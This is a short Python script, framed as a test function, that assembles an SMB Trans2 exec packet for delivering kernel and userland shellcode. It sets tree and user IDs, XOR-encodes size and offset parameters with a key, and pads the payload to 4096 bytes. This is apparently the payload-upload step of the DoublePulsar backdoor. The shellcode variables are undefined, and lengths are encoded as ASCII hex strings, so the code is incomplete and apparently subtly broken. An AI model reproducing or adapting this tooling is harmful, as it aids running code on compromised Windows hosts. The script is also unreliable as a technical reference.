import binascii
import socket
import struct

def test_function():
    #for testing purposes
    user_id = b'\x00'
    user_id += b'\x08'
    tree_id = b'\x00'
    tree_id += b'\x08'
    key = 0x58581162

    trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")

    # Replace tree ID and user ID in trans2 exec packet
    modified_trans2_exec_packet = bytearray(trans2_exec_packet)
    modified_trans2_exec_packet[28] = tree_id[0]
    modified_trans2_exec_packet[29] = tree_id[1]
    modified_trans2_exec_packet[32] = user_id[0]
    modified_trans2_exec_packet[33] = user_id[1]

    modified_kernel_shellcode = bytearray(kernel_shellcode)

    # add PAYLOAD shellcode length in bytes after the kernel shellcode and write this value
    userland_shellcode_len = len(userland_shellcode)
    payload_shellcode_len_as_str = format(userland_shellcode_len, '#04x')
    payload_shellcode_len_as_bytes = str.encode(payload_shellcode_len_as_str)
    print("userland_shellcode length = ",payload_shellcode_len_as_str)
    print("userland_shellcode length (BYTES) = ", payload_shellcode_len_as_bytes)

    payload_shellcode_len_append = bytearray(payload_shellcode_len_as_bytes)
    print(payload_shellcode_len_append)
    
    #add the hex len of the userland shellcode after the kernel shellcode
    modified_kernel_shellcode += payload_shellcode_len_append

    #convert userland shellcode to bytearray
    payload_shellcode = bytearray(userland_shellcode)

    # add the userland shellcode after the shellcode size
    modified_kernel_shellcode += payload_shellcode

    print('merged & modified_kernel_shellcode: {:d}'.format(len(modified_kernel_shellcode)))

    parameters = []
    Totalsize = len(modified_kernel_shellcode) ^ key
    TotalChunkSize = 4096 ^ key #in this test, the value is static since we will be filling the SMB data to 4096 bytes
    Offset = 0 ^ key

    Totalsize_as_str = format(Totalsize, '#04x')
    TotalChunkSize_as_str = format(TotalChunkSize, '#04x')
    Offset_as_str = format(Offset, '#04x')
    print(Totalsize_as_str, TotalChunkSize_as_str, Offset_as_str)

    parameters.append(Totalsize_as_str)
    parameters.append(TotalChunkSize_as_str)
    parameters.append(Offset_as_str)
    print(parameters)

    new_parameters = ''.join([Totalsize_as_str, TotalChunkSize_as_str, Offset_as_str])
    print(new_parameters)

    my_new_parameters_as_bytes = str.encode(new_parameters)
    append_my_new_parameters_as_bytes = bytearray(my_new_parameters_as_bytes)

    parameters_len = len(append_my_new_parameters_as_bytes)
    print("Parameters len = ", parameters_len)
    modified_trans2_exec_packet += append_my_new_parameters_as_bytes

    #pad bytes to 4096
    if (len(modified_kernel_shellcode) < 4096):
        padLen = 4096 - len(modified_kernel_shellcode)
        padBytes = '\x00' * padLen

        padBytesAsBytes = str.encode(padBytes)
        bytearray_padBytes = bytearray(padBytesAsBytes)
        modified_kernel_shellcode += bytearray_padBytes

    #add padded byte shellcode data to end of packet
    modified_trans2_exec_packet += modified_kernel_shellcode

    #format(shellcode_len, "03x")
    print('userland shellcode size: {:d}'.format(len(userland_shellcode)))
    print('kernel shellcode size: {:d}'.format(len(kernel_shellcode)))
    print('modified kernel shellcode size: {:d}'.format(len(modified_kernel_shellcode)))
    print('Total trans2 packet size: {:d}'.format(len(modified_trans2_exec_packet)))
    print('size of trans2 packet skeleton {:d}'.format(len(trans2_exec_packet)))

if __name__ == '__main__':
    test_function()
